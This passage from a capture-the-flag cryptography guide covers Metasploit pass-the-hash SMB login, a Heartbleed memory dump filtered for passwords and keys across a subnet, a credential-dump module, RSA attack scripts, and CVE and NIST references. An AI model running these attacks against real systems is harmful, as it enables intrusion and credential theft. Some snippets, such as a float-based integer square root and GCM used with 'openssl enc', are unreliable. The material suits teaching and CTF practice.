set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit
```

#### Custom Metasploit Crypto Modules

**Basic Module Structure for Crypto Exploits**

```ruby
# ~/.msf4/modules/auxiliary/crypto/custom_attack.rb
require 'msf/core'
require 'openssl'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Crypto Attack',
      'Description' => 'Exploits weak cryptographic implementation',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      OptString.new('RHOST', [true, 'Target host']),
      OptInt.new('RPORT', [true, 'Target port', 443]),
      OptString.new('CIPHERTEXT', [true, 'Base64 encoded ciphertext'])
    ])
  end

  def run
    ciphertext = Rex::Text.decode_base64(datastore['CIPHERTEXT'])
    
    print_status("Attempting decryption...")
    result = perform_attack(ciphertext)
    
    if result
      print_good("Plaintext recovered: #{result}")
    else
      print_error("Attack failed")
    end
  end

  def perform_attack(data)
    # [Inference] Attack logic implementation
    # Actual attack code would go here
  end
end
```

**RSA Module Example Structure**

```ruby
require 'openssl'

def weak_rsa_check(n, e)
  # Small exponent attack
  if e < 65537
    print_warning("Weak exponent detected: #{e}")
    return true
  end
  
  # Fermat factorization for close primes
  a = isqrt(n) + 1
  b_squared = a**2 - n
  
  100000.times do
    if is_perfect_square(b_squared)
      b = isqrt(b_squared)
      p = a - b
      q = a + b
      
      if p * q == n
        print_good("Factors found: p=#{p}, q=#{q}")
        return [p, q]
      end
    end
    a += 1
    b_squared = a**2 - n
  end
  
  false
end

def isqrt(n)
  Math.sqrt(n).to_i
end

def is_perfect_square(n)
  root = isqrt(n)
  root * root == n
end
```

#### Metasploit Resource Scripts for Crypto CTF

**Automated SSL Enumeration**

```bash
# ssl_recon.rc
use auxiliary/scanner/ssl/ssl_version
set RHOSTS file:/tmp/targets.txt
set THREADS 20
run

use auxiliary/scanner/ssl/ssl_cipher
set RHOSTS file:/tmp/targets.txt
set THREADS 20
run

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS file:/tmp/targets.txt
set VERBOSE false
run

# Execute with: msfconsole -r ssl_recon.rc
```

**Hash Cracking Pipeline**

```bash
# hash_pipeline.rc
workspace -a crypto_ctf

use auxiliary/analyze/crack_databases
set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
set ITERATION_TIMEOUT 600
run

use post/multi/gather/creds_dump
set SESSION -1
run

db_export -f pwdump /tmp/cracked_hashes.txt
```

#### Metasploit Database for Crypto Intelligence

**Storing and Querying Crypto Artifacts**

```bash
# Initialize database
msfdb init
msfconsole

# Store discovered keys
db_nmap -sV --script ssl-cert target.com
hosts
services -p 443 -S ssl

# Query stored certificates
db_export -f xml /tmp/ssl_certs.xml

# Store custom crypto data
creds add user:admin password:hash$5$abc... realm:ctf.example.com
```

**[Inference] Integration with External Tools**

```python
#!/usr/bin/env python3
# msf_crypto_integration.py

import subprocess
import json

def msf_ssl_scan(target):
    """
    [Inference] This pattern shows integration approach,
    actual results depend on target configuration
    """
    cmd = [
        'msfconsole', '-q', '-x',
        f'use auxiliary/scanner/ssl/ssl_version; '
        f'set RHOSTS {target}; '
        f'run; exit'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

def parse_msf_output(output):
    """
    Parse Metasploit output for crypto analysis
    """
    vulnerabilities = []
    if 'SSLv3' in output:
        vulnerabilities.append('POODLE_vulnerable')
    if 'TLSv1.0' in output:
        vulnerabilities.append('BEAST_possible')
    
    return vulnerabilities
```

**Key Metasploit Crypto Commands**

```bash
# Search crypto-related modules
search type:auxiliary ssl
search type:exploit crypto
search heartbleed

# Check module options
info auxiliary/scanner/ssl/openssl_heartbleed
show options

# Advanced module usage
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.0/24
set THREADS 50
set VERBOSE false
set DUMPFILTER (pass|key|secret)
run

# Save output
spool /tmp/heartbleed_output.txt
run
spool off
```

**Disclaimers:** [Inference] Attack success rates and module effectiveness depend on target configuration, network conditions, and specific vulnerability presence. The framework examples demonstrate structural patterns; actual exploitation requires adapting to specific CTF scenarios.

[Unverified] Metasploit module compatibility may vary across versions. Always verify module availability in your specific Metasploit Framework installation.

---

## Online Resources & Tools

### CyberChef (Cipher Identification & Decryption)

**CyberChef** is a web-based data manipulation framework developed by GCHQ. Access at `https://gchq.github.io/CyberChef/` or install locally via npm.

**Core Cryptographic Operations:**

Recipe chaining for multi-stage decoding:

```
Input → From Base64 → AES Decrypt → From Hex → XOR → Output
```

**Common CTF Recipes:**

Base encoding detection and decoding:

- `From Base64` - Standard Base64
- `From Base32` - RFC 4648 Base32
- `From Base58` - Bitcoin-style encoding
- `Magic` operation - Auto-detects encoding

XOR operations:

- `XOR` - Single byte or multi-byte key
- `XOR Brute Force` - Tests all single-byte keys (0x00-0xFF)
- Displays results sorted by likelihood based on character frequency

```
Recipe example for XOR brute force:
1. Input: encrypted hex string
2. From Hex
3. XOR Brute Force
4. Output shows all 256 possibilities ranked
```

Symmetric encryption modules:

- `AES Decrypt` - Supports ECB, CBC, CTR, GCM, CFB, OFB modes
    - Key formats: Hex, UTF8, Latin1, Base64
    - IV/Nonce configuration
    - PKCS#7 padding options
- `DES Decrypt` / `Triple DES Decrypt`
- `Blowfish Decrypt`
- `RC4` - Stream cipher operations

Hashing and verification:

- `MD5`, `SHA1`, `SHA2 (256/512)`, `SHA3`
- `HMAC` - Keyed hash functions
- `Bcrypt compare` - Password hash verification
- `Compare hashes` - Side-by-side comparison

**Advanced CTF Techniques:**

Magic operation workflow:

```
1. Paste unknown ciphertext
2. Add "Magic" operation (depth: 3-5)
3. Set intensive mode for thorough analysis
4. Reviews Base64, Hex, URL encoding, compression
```

[Inference] The Magic operation uses entropy analysis and pattern matching to suggest likely encodings, but results require manual verification.

Bitwise operations for custom schemes:

- `Rotate left/right` - ROT operations
- `Swap endianness` - Byte order manipulation
- `To Binary` → `AND/OR/XOR/NOT` → `From Binary`

Subsections for data extraction:

- `Strings` - Extract printable characters
- `Regular expression` - Pattern matching
- `Find/Replace` - Text manipulation
- `Split` / `Merge` - Data chunking

**Practical CTF Example:**

Multi-layer encoding challenge:

```
Input: VjFaS1IxWXhiRmRYYmxKV1lsZHplRll3Wkc5aU...

Recipe:
1. From Base64
2. From Base64 (again - double encoded)
3. ROT13
4. From Hex
5. Output: flag{...}
```

**Local Installation:**

```bash
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm run build
# Access via file://path/to/CyberChef/build/prod/CyberChef.html
```

Benefits of local installation:

- Offline availability during CTFs
- No data transmission concerns
- Faster processing for large files
- Custom operation development possible

### Dcode.fr (Classical Ciphers)

**Dcode.fr** (`https://www.dcode.fr/en`) specializes in classical and historical cipher analysis with automated solving capabilities.

**Classical Cipher Categories:**

Substitution ciphers:

- **Caesar Cipher** - Shift cipher with brute force (26 possibilities)
- **Affine Cipher** - Linear transformation: `E(x) = (ax + b) mod 26`
- **Atbash Cipher** - A↔Z, B↔Y reversal
- **Substitution Cipher** - Arbitrary letter mapping with frequency analysis
- **Homophonic Substitution** - Multiple ciphertext characters per plaintext

Transposition ciphers:

- **Rail Fence Cipher** - Zigzag pattern writing
    - Configurable rail count (2-10+ rails)
    - Auto-detection attempts all rail counts
- **Columnar Transposition** - Grid-based reordering
    - Key-based column permutation
    - Dictionary attack on key
- **Scytale Cipher** - Ancient cylindrical transposition

Polygraphic ciphers:

- **Playfair Cipher** - 5×5 grid, digraph substitution
    - Requires 25-letter key (I/J combined)
    - Auto key discovery via hill climbing
- **Four-Square Cipher** - 4 grids, enhanced Playfair
- **Bifid Cipher** - Fractionation with Polybius square

Polyalphabetic ciphers:

- **Vigenère Cipher** - Multiple Caesar shifts with repeating key
    - Kasiski examination for key length
    - Friedman test for key length estimation
    - Frequency analysis per key position
- **Beaufort Cipher** - Variant: `E(x) = (k - x) mod 26`
- **Gronsfeld Cipher** - Numeric key Vigenère variant
- **Autokey Cipher** - Self-extending key using plaintext

**Automated Analysis Features:**

Cipher identification tool:

```
Process:
1. Input ciphertext
2. Access "Cipher Identifier" tool
3. System analyzes:
   - Character frequency
   - Index of coincidence
   - Pattern structures
   - N-gram distributions
4. Returns ranked list of probable ciphers
```

[Inference] The identifier uses statistical heuristics and may misidentify short ciphertexts or unusual variants.

Frequency analysis capabilities:

- Letter frequency distribution graphs
- Bigram/trigram analysis
- Index of Coincidence calculation (English: ~0.067)
- Chi-squared test against expected distributions

**CTF-Specific Tools:**

Book cipher decoder:

- Requires reference text
- Supports page-line-word or word number formats
- Can attempt common books (Bible, Declaration of Independence)

Bacon cipher:

- Binary substitution using A/B groups
- Multiple font/format variants supported

Morse code:

- Standard International Morse
- American Morse variant
- Auto-detection of dit/dah separators

Pigpen/Masonic cipher:

- Symbol-based substitution
- Multiple grid layouts recognized

**Practical Workflow:**

Unknown classical cipher approach:

```
1. Use Cipher Identifier
   - Input full ciphertext
   - Note top 3-5 suggestions

2. Calculate Index of Coincidence
   - IoC ≈ 0.067: Monoalphabetic substitution
   - IoC ≈ 0.045: Polyalphabetic (Vigenère likely)
   - IoC ≈ 0.067 + patterns: Transposition

3. For Vigenère detection:
   - Use Kasiski examination
   - Find repeated sequences
   - Calculate GCD of distances
   - Test suggested key lengths

4. Apply frequency analysis
   - Match against English statistics
   - Check for common words (THE, AND, OF)
```

**Hash and Modern Crypto Tools:**

Available but limited:

- MD5, SHA hash calculators
- Basic Base64/Hex conversions
- ROT13/ROT47 implementations

[Unverified] Dcode.fr's modern crypto tools are less comprehensive than specialized platforms; use for classical ciphers primarily.

### FactorDB (RSA Factorization Database)

**FactorDB** (`http://factordb.com/`) is a crowdsourced database of integer factorizations, critical for RSA challenges with weak moduli.

**Query Methods:**

Web interface search:

```
Direct URL format:
http://factordb.com/index.php?query=<number>

Example:
http://factordb.com/index.php?query=123456789012345678901234567890123456789
```

API access (programmatic):

```python
import requests

def factordb_query(n):
    url = f"http://factordb.com/api?query={n}"
    response = requests.get(url)
    data = response.json()
    return data

# Response structure:
# {
#   "id": "...",
#   "status": "FF" | "CF" | "C" | "P" | "PRP" | "U",
#   "factors": [["factor1", exponent1], ["factor2", exponent2]]
# }
```

Status codes:

- `C` - Composite, but not fully factored
- `CF` - Composite, fully factored
- `FF` - Factorization complete
- `P` - Proven prime
- `PRP` - Probably prime
- `U` - Unit (1 or -1)

**Factorization Retrieval:**

```python
import requests

def get_factors(n):
    response = requests.get(f"http://factordb.com/api?query={n}")
    data = response.json()
    
    if data['status'] in ['FF', 'CF']:
        factors = []
        for factor_data in data['factors']:
            factor = int(factor_data[0])
            exponent = int(factor_data[1])
            factors.append((factor, exponent))
        return factors
    return None

# Example RSA modulus lookup:
n = 123456789012345678901234567890123456789
factors = get_factors(n)
if factors:
    print("p =", factors[0][0])
    print("q =", factors[1][0])
```

**CTF Integration:**

Automated RSA solving with FactorDB:

```python
from Crypto.Util.number import inverse, long_to_bytes
import requests

def solve_rsa_factordb(n, e, c):
    # Query FactorDB
    response = requests.get(f"http://factordb.com/api?query={n}")
    data = response.json()
    
    if data['status'] not in ['FF', 'CF']:
        return None
    
    # Extract p and q
    factors = [int(f[0]) for f in data['factors']]
    if len(factors) != 2:
        return None
    
    p, q = factors[0], factors[1]
    
    # Calculate private key
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    
    # Decrypt
    m = pow(c, d, n)
    plaintext = long_to_bytes(m)
    
    return plaintext

# Usage:
n = 0x9a9b9c...  # From challenge
e = 65537
c = 0x1a2b3c...  # Ciphertext
flag = solve_rsa_factordb(n, e, c)
```

**Known Factorization Patterns:**

Common weak moduli in CTFs:

- **Small factors** - Products of primes < 10^12
- **Fermat factors** - p and q very close: `|p - q|` small
- **Known primes** - Reused primes from previous challenges
- **Special forms** - Mersenne numbers, factorial-based

Batch checking script:

```python
def check_multiple_moduli(moduli_list):
    results = {}
    for n in moduli_list:
        response = requests.get(f"http://factordb.com/api?query={n}")
        data = response.json()
        if data['status'] in ['FF', 'CF']:
            results[n] = data['factors']
    return results
```

**Limitations:**

[Unverified] FactorDB coverage:

- Contains billions of factorizations
- Not exhaustive for all composites
- Larger numbers (>300 digits) less likely to be factored
- Recent CTF moduli may not be indexed yet

**Submitting Factorizations:**

Contributing new factors helps the community:

```
Web interface:
1. Navigate to http://factordb.com/
2. Enter number in search box
3. If unfactored, submit via "Add Factors" link
4. Provide factors with proof if possible
```

### RsaCtfTool (RSA Attacks Automation)

**RsaCtfTool** is a comprehensive Python framework automating multiple RSA attack vectors. Repository: `https://github.com/RsaCtfTool/RsaCtfTool`

**Installation:**

```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt
# Or use pipenv:
pipenv install
pipenv shell
```

Dependencies include:

- `gmpy2` - Fast arithmetic
- `pycryptodome` - Crypto primitives
- `sympy` - Number theory
- `requests` - FactorDB integration

**Basic Usage:**

Simple decryption with public key:

```bash
python3 RsaCtfTool.py --publickey public.pem --uncipherfile ciphertext.txt

# With custom output:
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.bin --output plaintext.txt
```

Multiple attack modes enabled:

```bash
# Enable all attacks (default)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --attack all

# Specific attack selection:
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --attack factordb,wiener,hastads
```

**Attack Types Implemented:**

Factorization-based attacks:

- **FactorDB** - Online database lookup
- **Fermat** - Close prime factorization
- **Pollard P-1** - Smooth p-1 factors
- **Williams P+1** - Smooth p+1 factors
- **ECM** - Elliptic curve method (via external tools)
- **Small q** - Trial division for small factors
- **Siqs** - Self-initializing quadratic sieve

Mathematical attacks:

- **Wiener** - Continued fractions for small d (d < n^0.25)
- **Boneh-Durfee** - Lattice-based small d attack (d < n^0.292)
- **Hastad** - Low public exponent broadcast attack
- **Common modulus** - Two messages, same n, different e
- **Small e** - e=3 with small plaintext (m^3 < n)

Multi-key attacks:

- **Common prime** - Shared factors across multiple keys (GCD attack)
- **Past CTF** - Database of known challenge keys
- **Partial key recovery** - Known bits of p or q

Side-channel style:

- **Timing** - Not applicable to offline CTF scenarios
- **LSB oracle** - Requires decryption oracle (not automated)

**Advanced Usage Patterns:**

Multiple public keys (common prime attack):

```bash
# Automatically detects shared factors
python3 RsaCtfTool.py --publickey key1.pem key2.pem key3.pem --uncipherfile cipher.txt
```

Private key generation from factors:

```bash
# If you've manually found p and q
python3 RsaCtfTool.py --createprivate --p <p_value> --q <q_value>
```

Custom parameter input:

```bash
# Direct n, e, c values
python3 RsaCtfTool.py --n <modulus> --e <exponent> --uncipher <ciphertext_int>
```

Verbose output for debugging:

```bash
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt -v
# Shows which attacks are attempted and why they fail
```

**Practical CTF Scenarios:**

Scenario 1: Unknown weak modulus

```bash
python3 RsaCtfTool.py --publickey challenge.pem --uncipherfile flag.enc --attack all

# Tool automatically:
# 1. Checks FactorDB
# 2. Tries Fermat factorization
# 3. Tests Wiener attack
# 4. Attempts small prime factorization
```

Scenario 2: Multiple related ciphertexts

```bash
# Hastad's broadcast attack (same message, different keys, e=3)
python3 RsaCtfTool.py \
  --publickey key1.pem key2.pem key3.pem \
  --uncipherfile c1.txt c2.txt c3.txt \
  --attack hastads
```

Scenario 3: Common modulus attack

```bash
# Two ciphertexts, same n, coprime e1 and e2
python3 RsaCtfTool.py \
  --publickey pub1.pem pub2.pem \
  --uncipherfile cipher1.txt cipher2.txt \
  --attack common_modulus
```

**Custom Attack Integration:**

The tool is modular; custom attacks can be added:

```python
# attacks/custom_attack.py
class Attack:
    def __init__(self, attack_config):
        self.config = attack_config
    
    def attack(self, publickey, cipher):
        # Your custom attack logic
        # Return private key or plaintext if successful
        pass
    
    def test(self):
        # Test conditions for attack applicability
        pass
```

**Configuration Options:**

Timeout settings:

```bash
# Set per-attack timeout (seconds)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --timeout 300
```

Thread control:

```bash
# Parallel attack execution
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --threads 4
```

**Output Formats:**

```bash
# Hex output
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --output-format hex

# Raw binary
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --output plaintext.bin

# Automatic format detection (default)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt
```

**Limitations and Considerations:**

[Inference] RsaCtfTool effectiveness depends on:

- Attack implementation quality (varies by attack type)
- Available computational resources
- Specific parameter ranges of the challenge

[Unverified] Success rates by attack type:

- FactorDB lookup: High for CTF challenges (commonly seeded)
- Wiener attack: Moderate (requires d < n^0.25)
- Fermat: High if |p-q| < 10^6 or similar
- Small e: High if m^e < n

The tool does not guarantee success against:

- Strong, properly generated RSA keys (2048+ bit, random primes)
- Novel attack vectors not yet implemented
- Challenges requiring side-channel analysis

**Integration with Other Tools:**

Combining with manual analysis:

```bash
# 1. Try RsaCtfTool first
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt -v > analysis.log

# 2. If failed, extract n and e for manual work
openssl rsa -pubin -in pub.pem -text -noout

# 3. Manual FactorDB check
# Visit http://factordb.com/ with n value

# 4. Try specialized tools for specific attacks
# yafu, msieve for advanced factorization
```

SageMath integration for Boneh-Durfee:

```bash
# RsaCtfTool uses SageMath if available
# Install: apt install sagemath
# Tool automatically detects and uses for lattice attacks
```

### Important Tool Combinations for CTF Success

**Recommended Workflow:**

```
1. Initial Analysis:
   - CyberChef Magic → Identify encoding layers
   - Dcode.fr Cipher Identifier → Classify cipher type

2. Classical Ciphers:
   - Dcode.fr automated solvers
   - CyberChef for multi-stage decoding

3. RSA Challenges:
   - RsaCtfTool first attempt
   - FactorDB manual verification if tool fails
   - Custom scripts for novel attacks

4. Verification:
   - CyberChef for format conversion
   - Manual inspection of decoded output
```

These tools form the foundation of crypto CTF solving, but success often requires combining automated approaches with manual cryptanalysis and custom scripting.

---

# VULNERABILITY DATABASES & FRAMEWORKS

## Known Weaknesses

### CVE (Common Vulnerabilities and Exposures)

CVE is a standardized identifier system for publicly disclosed cybersecurity vulnerabilities, critical for identifying exploitable cryptographic weaknesses in CTF challenges.

#### CVE Identifier Format

```
CVE-YEAR-NUMBER
Example: CVE-2014-0160 (Heartbleed)
```

#### Major Cryptographic CVEs

**Heartbleed (CVE-2014-0160)**

bash

```bash
# OpenSSL TLS heartbeat extension vulnerability
# Affected: OpenSSL 1.0.1 through 1.0.1f

# Testing with Nmap
nmap -p 443 --script ssl-heartbleed target.ctf

# Metasploit module
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.ctf
set RPORT 443
run

# Manual exploitation (Python)
git clone https://github.com/sensepost/heartbleed-poc
python heartbleed-poc.py target.ctf -p 443
```

**POODLE (CVE-2014-3566)**

bash

```bash
# SSLv3 padding oracle vulnerability
# Affects: SSLv3 protocol

# Detection
nmap --script ssl-poodle -p 443 target.ctf

# OpenSSL testing
openssl s_client -connect target.ctf:443 -ssl3

# Exploitation requires MitM positioning
# Downgrade attack to force SSLv3
```

**DROWN (CVE-2016-0800)**

bash

```bash
# Cross-protocol attack on TLS using SSLv2
# Decrypting Reused Old Weakly encrypted Navigation

# Detection
nmap --script ssl-drown -p 443 target.ctf

# Check SSLv2 support
openssl s_client -connect target.ctf:443 -ssl2

# Requires SSLv2 enabled on server
# Captures TLS sessions, decrypts via SSLv2
```

**BEAST (CVE-2011-3389)**

bash

```bash
# Browser Exploit Against SSL/TLS
# Cipher Block Chaining (CBC) vulnerability in TLS 1.0

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "CBC"

# Identify TLS 1.0 with CBC ciphers
testssl.sh --beast target.ctf:443
```

**CRIME (CVE-2012-4929)**

bash

```bash
# Compression Ratio Info-leak Made Easy
# TLS compression side-channel attack

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf

# Check compression support
openssl s_client -connect target.ctf:443 | grep "Compression"

# testssl.sh check
testssl.sh --crime target.ctf:443
```

**BREACH (CVE-2013-3587)**

bash

```bash
# Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext
# HTTP compression attack (CRIME variant)

# No direct tool detection
# Manual analysis: Check HTTP responses for compression
curl -I https://target.ctf | grep "Content-Encoding"

# Exploitation requires:
# - HTTPS with HTTP compression
# - User input reflected in response
# - Secret in response body
```

**Logjam (CVE-2015-4000)**

bash

```bash
# Diffie-Hellman key exchange weakness
# Export-grade cipher downgrade attack

# Detection
nmap --script ssl-dh-params target.ctf

# Comprehensive check
testssl.sh --logjam target.ctf:443

# Check DH parameter size
openssl s_client -connect target.ctf:443 -cipher "EDH" | grep "Server Temp Key"
```

**FREAK (CVE-2015-0204)**

bash

```bash
# Factoring RSA Export Keys
# Forces use of weak export-grade RSA keys

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "EXPORT"

# OpenSSL check
openssl s_client -connect target.ctf:443 -cipher EXPORT

# testssl.sh
testssl.sh --freak target.ctf:443
```

**RC4 Cipher Vulnerabilities**

bash

```bash
# Multiple CVEs: CVE-2013-2566, CVE-2015-2808

# Detection
nmap --script ssl-enum-ciphers -p 443 target.ctf | grep "RC4"

# testssl.sh check
testssl.sh --rc4 target.ctf:443

# OpenSSL enumeration
openssl ciphers -v | grep RC4
```

**ROBOT (CVE-2017-6168)**

bash

```bash
# Return Of Bleichenbacher's Oracle Threat
# RSA PKCS#1 v1.5 padding oracle

# Testing tool
git clone https://github.com/robotattackorg/robot-detect
cd robot-detect
python robot-detect.py target.ctf 443

# Requires multiple TLS connection attempts
# Analyzes error responses for padding oracle
```

#### CVE Database Searching

**Online Resources:**

bash

```bash
# CVE Search via command line
curl -s "https://cve.circl.lu/api/search/openssl" | jq .

# National Vulnerability Database API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=openssl"

# CVE Details website search
# https://www.cvedetails.com/
```

**Local CVE Database:**

bash

```bash
# Install CVE-Search
git clone https://github.com/cve-search/cve-search.git
cd cve-search
pip install -r requirements.txt
./sbin/db_mgmt.py -p
./sbin/db_updater.py -c

# Query local database
python bin/search.py -s openssl

# Web interface
./web/index.py
# Access: http://localhost:5000
```

### NVD (National Vulnerability Database)

NVD is the U.S. government repository of standards-based vulnerability management data, providing comprehensive CVE information with CVSS scoring.

#### NVD API Usage

**API v2.0 Access:**

bash

```bash
# Basic CVE lookup
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2014-0160" | jq .

# Search by keyword
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=heartbleed" | jq .

# Date range filtering
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=2020-01-01T00:00:00.000&pubEndDate=2020-12-31T23:59:59.999" | jq .

# CVSS v3 severity filtering
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cvssV3Severity=CRITICAL" | jq .
```

**Python NVD Integration:**

python

```python
import requests
import json

def query_nvd(cve_id):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        return data
    else:
        return None

# Example usage
cve_data = query_nvd("CVE-2014-0160")
print(json.dumps(cve_data, indent=2))
```

**CVSS Scoring Interpretation:**

```
CVSS v3.1 Score Ranges:
- None: 0.0
- Low: 0.1-3.9
- Medium: 4.0-6.9
- High: 7.0-8.9
- Critical: 9.0-10.0

# Automated scoring lookup
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2014-0160" | \
  jq '.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore'
```

#### NVD Search Strategies for CTF

**Cryptographic Library Search:**

bash

```bash
# OpenSSL vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=openssl&resultsPerPage=50" | \
  jq '.vulnerabilities[].cve.id'

# libgcrypt vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=libgcrypt" | \
  jq '.vulnerabilities[].cve.id'

# GnuTLS vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=gnutls" | \
  jq '.vulnerabilities[].cve.id'
```

**Protocol-Specific Search:**

bash

```bash
# TLS/SSL vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=TLS" | jq .

# SSH vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=SSH" | jq .

# IPSec vulnerabilities
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=IPSec" | jq .
```

### NIST Cryptographic Standards

NIST (National Institute of Standards and Technology) publishes authoritative cryptographic standards used globally, with known deprecated algorithms frequently appearing in CTF challenges.

#### FIPS Publications

**FIPS 140-2/140-3:**

```
Cryptographic Module Validation Program
Defines security requirements for cryptographic modules

Levels:
1. Basic security requirements
2. Physical tamper-evidence
3. Tamper-resistant physical security
4. Complete envelope of protection

# Check if implementation is FIPS validated
openssl version
# Look for FIPS indicators

# Enable FIPS mode (if compiled with FIPS)
openssl fipsinstall -out /usr/local/ssl/fipsmodule.cnf -module /usr/local/lib/ossl-modules/fips.so
```

**FIPS 180-4 (Secure Hash Standard):**

bash

```bash
# Approved hash functions
# SHA-1 (deprecated for most uses)
# SHA-2 family: SHA-224, SHA-256, SHA-384, SHA-512
# SHA-3 family

# Generate hashes per FIPS 180-4
echo "test" | openssl dgst -sha256
echo "test" | openssl dgst -sha512
echo "test" | openssl dgst -sha3-256
```

**FIPS 186-4 (Digital Signature Standard):**

bash

```bash
# DSA key generation (per FIPS 186-4)
openssl dsaparam -out dsaparam.pem 2048
openssl gendsa -out dsa_key.pem dsaparam.pem

# RSA signatures (FIPS approved key sizes: 2048, 3072)
openssl genrsa -out rsa_key.pem 2048
openssl rsa -in rsa_key.pem -pubout -out rsa_pub.pem

# ECDSA (approved curves: P-256, P-384, P-521)
openssl ecparam -name prime256v1 -genkey -out ec_key.pem
```

**FIPS 197 (AES Standard):**

bash

```bash
# Advanced Encryption Standard
# Key sizes: 128, 192, 256 bits

# AES-256-CBC encryption
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.enc -k password

# AES-128-GCM (authenticated encryption)
openssl enc -aes-128-gcm -in plaintext.txt -out ciphertext.enc -k password

# AES-256-CTR
openssl enc -aes-256-ctr -in plaintext.txt -out ciphertext.enc -k password
```

#### SP 800 Series (Special Publications)

**SP 800-38 Series (Block Cipher Modes):**

bash

```bash
# SP 800-38A: ECB, CBC, CFB, OFB, CTR
# SP 800-38D: GCM (Galois/Counter Mode)
# SP 800-38F: Key Wrap

# CBC mode (requires IV)
openssl enc -aes-256-cbc -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>

# GCM mode (authenticated encryption)
openssl enc -aes-256-gcm -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>

# CTR mode
openssl enc -aes-256-ctr -in file.txt -out file.enc -K <hex_key> -iv <hex_iv>
```

**SP 800-56 (Key Establishment):**

bash

```bash
# SP 800-56A: Diffie-Hellman and ECDH
# SP 800-56B: RSA key establishment

# Generate DH parameters (per SP 800-56A)
openssl dhparam -out dh2048.pem 2048

# ECDH key agreement (P-256 curve)
openssl ecparam -name prime256v1 -genkey -out alice_key.pem
openssl ecparam -name prime256v1 -genkey -out bob_key.pem

# Extract public keys
openssl ec -in alice_key.pem -pubout -out alice_pub.pem
openssl ec -in bob_key.pem -pubout -out bob_pub.pem
```

**SP 800-90 (Random Number Generation):**

bash

```bash
# SP 800-90A: DRBG specifications
# SP 800-90B: Entropy source requirements

# Linux CSPRNG (compliant implementation)
# /dev/random - blocking, high entropy
# /dev/urandom - non-blocking, suitable for crypto

# Generate random bytes
dd if=/dev/urandom of=random.bin bs=32 count=1

# OpenSSL random generation
openssl rand -hex 32
openssl rand -base64 32

# Check available entropy
cat /proc/sys/kernel/random/entropy_avail
```

**SP 800-132 (Password-Based Key Derivation):**

bash

```bash
# PBKDF2 specification

# Generate key from password using PBKDF2
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -in file.txt -out file.enc -k password

# Python implementation
python3 << EOF
from hashlib import pbkdf2_hmac
import binascii

password = b"password"
salt = b"salt1234"
iterations = 100000
key = pbkdf2_hmac('sha256', password, salt, iterations)
print(binascii.hexlify(key).decode())
EOF
```

#### Deprecated/Weak Standards (Common in CTF)

**MD5 (FIPS 180-1 - Deprecated):**

bash

```bash
# Known collision vulnerabilities
# Still found in legacy systems and CTF challenges

# Generate MD5 hash
echo "test" | md5sum
openssl dgst -md5 file.txt

# Collision generation tools
# HashClash for MD5 collisions
git clone https://github.com/cr-marcstevens/hashclash
```

**SHA-1 (FIPS 180-1 - Deprecated 2011):**

bash

```bash
# Collision attacks demonstrated (SHAttered, 2017)
# Deprecated for digital signatures

# Generate SHA-1 hash
echo "test" | sha1sum
openssl dgst -sha1 file.txt

# SHAttered collision detection
git clone https://github.com/nneonneo/sha1collider
python sha1collider.py file1.pdf file2.pdf
```

**DES/3DES (FIPS 46-3 - Withdrawn):**

bash

```bash
# DES: 56-bit key (insecure)
# 3DES: Being phased out

# DES encryption (educational only)
openssl enc -des -in plaintext.txt -out ciphertext.enc -k password

# 3DES encryption
openssl enc -des3 -in plaintext.txt -out ciphertext.enc -k password

# Brute force DES key (56-bit space)
# Modern hardware can crack in hours
```

**RSA < 2048 bits:**

bash

```bash
# NIST deprecated RSA-1024 after 2013
# RSA-2048 minimum for new applications

# Generate weak RSA key (CTF scenarios)
